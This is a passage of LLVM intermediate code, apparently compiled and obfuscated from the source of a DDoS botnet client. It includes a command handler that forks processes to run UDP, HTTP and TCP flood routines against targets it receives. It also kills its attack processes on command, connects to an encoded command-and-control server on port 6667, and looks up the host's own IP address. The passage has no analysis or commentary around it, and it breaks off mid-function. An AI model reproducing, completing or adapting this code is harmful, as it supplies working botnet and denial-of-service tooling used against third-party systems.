  %415 = call i32 (i32, i8*, ...) @sockprintf(i32 %411, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.63, i32 0, i32 0), i8* %412, i32 %413, i32 %414)
  %416 = load i8*, i8** %14, align 8
  %417 = load i32, i32* %15, align 4
  %418 = load i32, i32* %16, align 4
  %419 = load i32, i32* %17, align 4
  %420 = load i32, i32* %18, align 4
  %421 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %416, i32 %417, i32 %418, i32 %419, i32 %420, i32 %421)
  %422 = load i32, i32* @mainCommSock, align 4
  %423 = call i32 @close(i32 %422)
  call void @_exit(i32 0) #12
  unreachable

; <label>:424:                                    ; preds = %loopEntry
  store i32 -1466179456, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 0
  %428 = load i8*, i8** %427, align 8
  %429 = call i32 @strcmp(i8* %428, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0)) #10
  %430 = icmp ne i32 %429, 0
  %431 = select i1 %430, i32 1299602108, i32 97801461
  store i32 %431, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i32, i32* %3, align 4
  %434 = icmp slt i32 %433, 3
  %435 = select i1 %434, i32 -1787782989, i32 856613100
  store i32 %435, i32* %switchVar
  br label %loopEnd

; <label>:436:                                    ; preds = %loopEntry
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 2
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* %439) #10
  %441 = icmp slt i32 %440, 1
  %442 = select i1 %441, i32 -1787782989, i32 1336388324
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i8**, i8*** %4, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 1
  %447 = load i8*, i8** %446, align 8
  store i8* %447, i8** %21, align 8
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 2
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @atoi(i8* %450) #10
  store i32 %451, i32* %22, align 4
  %452 = load i8*, i8** %21, align 8
  %453 = call i8* @strstr(i8* %452, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %454 = icmp ne i8* %453, null
  %455 = select i1 %454, i32 -1699809848, i32 1436902326
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i32, i32* @mainCommSock, align 4
  %458 = load i8*, i8** %21, align 8
  %459 = load i32, i32* %22, align 4
  %460 = call i32 (i32, i8*, ...) @sockprintf(i32 %457, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %458, i32 %459)
  %461 = load i8*, i8** %21, align 8
  %462 = call i8* @strtok(i8* %461, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %462, i8** %23, align 8
  store i32 -698470696, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  %464 = load i8*, i8** %23, align 8
  %465 = icmp ne i8* %464, null
  %466 = select i1 %465, i32 -1734012489, i32 61881926
  store i32 %466, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = call i32 @listFork()
  %469 = icmp ne i32 %468, 0
  %470 = select i1 %469, i32 -2063464048, i32 -1177053193
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = load i8*, i8** %21, align 8
  %473 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %472, i32 %473)
  %474 = load i32, i32* @mainCommSock, align 4
  %475 = call i32 @close(i32 %474)
  call void @_exit(i32 0) #12
  unreachable

; <label>:476:                                    ; preds = %loopEntry
  %477 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %477, i8** %23, align 8
  store i32 -698470696, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  store i32 -1288693446, i32* %switchVar
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  %480 = call i32 @listFork()
  %481 = icmp ne i32 %480, 0
  %482 = select i1 %481, i32 361589304, i32 -1906043651
  store i32 %482, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i32, i32* @mainCommSock, align 4
  %486 = load i8*, i8** %21, align 8
  %487 = load i32, i32* %22, align 4
  %488 = call i32 (i32, i8*, ...) @sockprintf(i32 %485, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %486, i32 %487)
  %489 = load i8*, i8** %21, align 8
  %490 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %489, i32 %490)
  %491 = load i32, i32* @mainCommSock, align 4
  %492 = call i32 @close(i32 %491)
  call void @_exit(i32 0) #12
  unreachable

; <label>:493:                                    ; preds = %loopEntry
  store i32 1299602108, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 0
  %497 = load i8*, i8** %496, align 8
  %498 = call i32 @strcmp(i8* %497, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %499 = icmp ne i32 %498, 0
  %500 = select i1 %499, i32 1410024604, i32 272524128
  store i32 %500, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  %502 = load i32, i32* %3, align 4
  %503 = icmp slt i32 %502, 6
  %504 = select i1 %503, i32 -1392526295, i32 1455667274
  store i32 %504, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i8**, i8*** %4, align 8
  %507 = getelementptr inbounds i8*, i8** %506, i64 3
  %508 = load i8*, i8** %507, align 8
  %509 = call i32 @atoi(i8* %508) #10
  %510 = icmp eq i32 %509, -1
  %511 = select i1 %510, i32 -1392526295, i32 -465944982
  store i32 %511, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  %513 = load i8**, i8*** %4, align 8
  %514 = getelementptr inbounds i8*, i8** %513, i64 2
  %515 = load i8*, i8** %514, align 8
  %516 = call i32 @atoi(i8* %515) #10
  %517 = icmp eq i32 %516, -1
  %518 = select i1 %517, i32 -1392526295, i32 -1193282976
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %4, align 8
  %521 = getelementptr inbounds i8*, i8** %520, i64 4
  %522 = load i8*, i8** %521, align 8
  %523 = call i32 @atoi(i8* %522) #10
  %524 = icmp eq i32 %523, -1
  %525 = select i1 %524, i32 -1392526295, i32 426523568
  store i32 %525, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 4
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @atoi(i8* %529) #10
  %531 = icmp sgt i32 %530, 32
  %532 = select i1 %531, i32 -1392526295, i32 1629657231
  store i32 %532, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = load i32, i32* %3, align 4
  %535 = icmp sgt i32 %534, 6
  %536 = select i1 %535, i32 103541763, i32 494959690
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = load i8**, i8*** %4, align 8
  %539 = getelementptr inbounds i8*, i8** %538, i64 6
  %540 = load i8*, i8** %539, align 8
  %541 = call i32 @atoi(i8* %540) #10
  %542 = icmp slt i32 %541, 0
  %543 = select i1 %542, i32 -1392526295, i32 494959690
  store i32 %543, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i32, i32* %3, align 4
  %546 = icmp eq i32 %545, 8
  %547 = select i1 %546, i32 1801376136, i32 -1223345498
  store i32 %547, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = load i8**, i8*** %4, align 8
  %550 = getelementptr inbounds i8*, i8** %549, i64 7
  %551 = load i8*, i8** %550, align 8
  %552 = call i32 @atoi(i8* %551) #10
  %553 = icmp slt i32 %552, 1
  %554 = select i1 %553, i32 -1392526295, i32 -1223345498
  store i32 %554, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 1
  %559 = load i8*, i8** %558, align 8
  store i8* %559, i8** %24, align 8
  %560 = load i8**, i8*** %4, align 8
  %561 = getelementptr inbounds i8*, i8** %560, i64 2
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @atoi(i8* %562) #10
  store i32 %563, i32* %25, align 4
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 3
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 @atoi(i8* %566) #10
  store i32 %567, i32* %26, align 4
  %568 = load i8**, i8*** %4, align 8
  %569 = getelementptr inbounds i8*, i8** %568, i64 4
  %570 = load i8*, i8** %569, align 8
  %571 = call i32 @atoi(i8* %570) #10
  store i32 %571, i32* %27, align 4
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 5
  %574 = load i8*, i8** %573, align 8
  store i8* %574, i8** %28, align 8
  %575 = load i32, i32* %3, align 4
  %576 = icmp eq i32 %575, 8
  %577 = select i1 %576, i32 1330192380, i32 1276226261
  store i32 %577, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 7
  %581 = load i8*, i8** %580, align 8
  %582 = call i32 @atoi(i8* %581) #10
  store i32 -1759135373, i32* %switchVar
  store i32 %582, i32* %.reg2mem4
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  store i32 -1759135373, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:584:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %29, align 4
  %585 = load i32, i32* %3, align 4
  %586 = icmp sgt i32 %585, 6
  %587 = select i1 %586, i32 -1154509280, i32 -838060420
  store i32 %587, i32* %switchVar
  br label %loopEnd

; <label>:588:                                    ; preds = %loopEntry
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 6
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @atoi(i8* %591) #10
  store i32 350257168, i32* %switchVar
  store i32 %592, i32* %.reg2mem6
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  store i32 350257168, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:594:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %30, align 4
  %595 = load i8*, i8** %24, align 8
  %596 = call i8* @strstr(i8* %595, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %597 = icmp ne i8* %596, null
  %598 = select i1 %597, i32 1111184655, i32 -1354428880
  store i32 %598, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* @mainCommSock, align 4
  %601 = load i8*, i8** %24, align 8
  %602 = load i32, i32* %26, align 4
  %603 = call i32 (i32, i8*, ...) @sockprintf(i32 %600, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %601, i32 %602)
  %604 = load i8*, i8** %24, align 8
  %605 = call i8* @strtok(i8* %604, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %605, i8** %31, align 8
  store i32 1861259246, i32* %switchVar
  br label %loopEnd

; <label>:606:                                    ; preds = %loopEntry
  %607 = load i8*, i8** %31, align 8
  %608 = icmp ne i8* %607, null
  %609 = select i1 %608, i32 968003514, i32 1961461074
  store i32 %609, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = call i32 @listFork()
  %612 = icmp ne i32 %611, 0
  %613 = select i1 %612, i32 624188406, i32 1907195227
  store i32 %613, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = load i8*, i8** %31, align 8
  %616 = load i32, i32* %25, align 4
  %617 = load i32, i32* %26, align 4
  %618 = load i32, i32* %27, align 4
  %619 = load i8*, i8** %28, align 8
  %620 = load i32, i32* %30, align 4
  %621 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %615, i32 %616, i32 %617, i32 %618, i8* %619, i32 %620, i32 %621)
  %622 = load i32, i32* @mainCommSock, align 4
  %623 = call i32 @close(i32 %622)
  call void @_exit(i32 0) #12
  unreachable

; <label>:624:                                    ; preds = %loopEntry
  %625 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %625, i8** %31, align 8
  store i32 1861259246, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  store i32 744828773, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = call i32 @listFork()
  %629 = icmp ne i32 %628, 0
  %630 = select i1 %629, i32 -1903499090, i32 -2138324663
  store i32 %630, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i32, i32* @mainCommSock, align 4
  %634 = load i8*, i8** %24, align 8
  %635 = load i32, i32* %26, align 4
  %636 = call i32 (i32, i8*, ...) @sockprintf(i32 %633, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %634, i32 %635)
  %637 = load i8*, i8** %24, align 8
  %638 = load i32, i32* %25, align 4
  %639 = load i32, i32* %26, align 4
  %640 = load i32, i32* %27, align 4
  %641 = load i8*, i8** %28, align 8
  %642 = load i32, i32* %30, align 4
  %643 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %637, i32 %638, i32 %639, i32 %640, i8* %641, i32 %642, i32 %643)
  %644 = load i32, i32* @mainCommSock, align 4
  %645 = call i32 @close(i32 %644)
  call void @_exit(i32 0) #12
  unreachable

; <label>:646:                                    ; preds = %loopEntry
  store i32 1410024604, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  %648 = load i8**, i8*** %4, align 8
  %649 = getelementptr inbounds i8*, i8** %648, i64 0
  %650 = load i8*, i8** %649, align 8
  %651 = call i32 @strcmp(i8* %650, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #10
  %652 = icmp ne i32 %651, 0
  %653 = select i1 %652, i32 1424520574, i32 804635081
  store i32 %653, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i64 0, i64* %33, align 8
  store i32 1489406816, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  %656 = load i64, i64* %33, align 8
  %657 = load i64, i64* @numpids, align 8
  %658 = icmp ult i64 %656, %657
  %659 = select i1 %658, i32 1914768272, i32 -15192375
  store i32 %659, i32* %switchVar
  br label %loopEnd

; <label>:660:                                    ; preds = %loopEntry
  %661 = load i32*, i32** @pids, align 8
  %662 = load i64, i64* %33, align 8
  %663 = getelementptr inbounds i32, i32* %661, i64 %662
  %664 = load i32, i32* %663, align 4
  %665 = icmp ne i32 %664, 0
  %666 = select i1 %665, i32 -15287120, i32 -1712884790
  store i32 %666, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  %668 = load i32*, i32** @pids, align 8
  %669 = load i64, i64* %33, align 8
  %670 = getelementptr inbounds i32, i32* %668, i64 %669
  %671 = load i32, i32* %670, align 4
  %672 = call i32 @getpid() #4
  %673 = icmp ne i32 %671, %672
  %674 = select i1 %673, i32 1946246611, i32 -1712884790
  store i32 %674, i32* %switchVar
  br label %loopEnd

; <label>:675:                                    ; preds = %loopEntry
  %676 = load i32*, i32** @pids, align 8
  %677 = load i64, i64* %33, align 8
  %678 = getelementptr inbounds i32, i32* %676, i64 %677
  %679 = load i32, i32* %678, align 4
  %680 = call i32 @kill(i32 %679, i32 9) #4
  %681 = load i32, i32* %32, align 4
  %682 = add nsw i32 %681, 1
  store i32 %682, i32* %32, align 4
  store i32 -1712884790, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  store i32 1990027260, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i64, i64* %33, align 8
  %686 = add i64 %685, 1
  store i64 %686, i64* %33, align 8
  store i32 1489406816, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %32, align 4
  %689 = icmp sgt i32 %688, 0
  %690 = select i1 %689, i32 380874902, i32 -1764699692
  store i32 %690, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = load i32, i32* @mainCommSock, align 4
  %693 = load i32, i32* %32, align 4
  %694 = call i32 (i32, i8*, ...) @sockprintf(i32 %692, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.69, i32 0, i32 0), i32 %693)
  store i32 -711342372, i32* %switchVar
  br label %loopEnd

; <label>:695:                                    ; preds = %loopEntry
  %696 = load i32, i32* @mainCommSock, align 4
  %697 = call i32 (i32, i8*, ...) @sockprintf(i32 %696, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0))
  store i32 -711342372, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  store i32 1424520574, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  %700 = load i8**, i8*** %4, align 8
  %701 = getelementptr inbounds i8*, i8** %700, i64 0
  %702 = load i8*, i8** %701, align 8
  %703 = call i32 @strcmp(i8* %702, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0)) #10
  %704 = icmp ne i32 %703, 0
  %705 = select i1 %704, i32 -642386595, i32 1647615528
  store i32 %705, i32* %switchVar
  br label %loopEnd

; <label>:706:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:707:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %699, %698, %695, %691, %687, %684, %683, %675, %667, %660, %655, %654, %647, %646, %631, %627, %626, %624, %610, %606, %599, %594, %593, %588, %584, %583, %578, %556, %555, %548, %544, %537, %533, %526, %519, %512, %505, %501, %494, %493, %483, %479, %478, %476, %467, %463, %456, %444, %443, %436, %432, %425, %424, %409, %405, %404, %402, %389, %385, %378, %373, %372, %367, %344, %343, %336, %332, %325, %318, %311, %304, %297, %290, %286, %279, %278, %266, %262, %261, %259, %249, %245, %237, %221, %220, %213, %206, %202, %195, %194, %182, %178, %177, %175, %165, %161, %153, %137, %136, %129, %122, %118, %111, %110, %108, %107, %103, %101, %96, %95, %91, %84, %81, %80, %76, %69, %66, %62, %55, %50, %43, %40, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 658552272, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 658552272, label %first
    i32 95340389, label %8
    i32 -153009159, label %11
    i32 68515303, label %17
    i32 -1643087046, label %18
    i32 -2005383009, label %21
    i32 -632487360, label %33
    i32 1836913949, label %40
    i32 1930716169, label %48
    i32 -1965321364, label %49
    i32 -996721388, label %50
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 95340389, i32 -153009159
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -153009159, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 68515303, i32 -1643087046
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -2005383009, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -2005383009, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @decode(i8* %26)
  %28 = call i8* @strcpy(i8* %22, i8* %27) #4
  store i32 6667, i32* %3, align 4
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %30 = call i8* @strchr(i8* %29, i32 58) #10
  %31 = icmp ne i8* %30, null
  %32 = select i1 %31, i32 -632487360, i32 1836913949
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = call i32 @atoi(i8* %36) #10
  store i32 %37, i32* %3, align 4
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %39 = call i8* @strchr(i8* %38, i32 58) #10
  store i8 0, i8* %39, align 1
  store i32 1836913949, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = call i32 @socket(i32 2, i32 1, i32 0) #4
  store i32 %41, i32* @mainCommSock, align 4
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @connectTimeout(i32 %42, i8* %43, i32 %44, i32 30)
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -1965321364, i32 1930716169
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -996721388, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -996721388, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %1, align 4
  ret i32 %51

loopEnd:                                          ; preds = %49, %48, %40, %33, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #4
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -252741438, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -252741438, label %first
    i32 -2085024973, label %16
    i32 1563164017, label %17
    i32 -2097131986, label %31
    i32 1734073649, label %32
    i32 546742936, label %39
    i32 865480086, label %40
    i32 -603256167, label %45
    i32 795257067, label %51
    i32 -1741846756, label %56
    i32 1835511019, label %58
    i32 -1826415965, label %64
    i32 545992941, label %67
    i32 385268489, label %69
    i32 -1689821568, label %71
    i32 -1062038256, label %78
    i32 144608449, label %86
    i32 1327123982, label %90
    i32 -1798913154, label %102
    i32 -1242546498, label %105
    i32 -600416121, label %106
    i32 -1701099013, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -2085024973, i32 1563164017
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1701099013, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i32 0, i32 0)) #4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 -2097131986, i32 1734073649
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1701099013, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #4
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 546742936, i32 865480086
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1701099013, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -603256167, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 795257067, i32 -1689821568
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
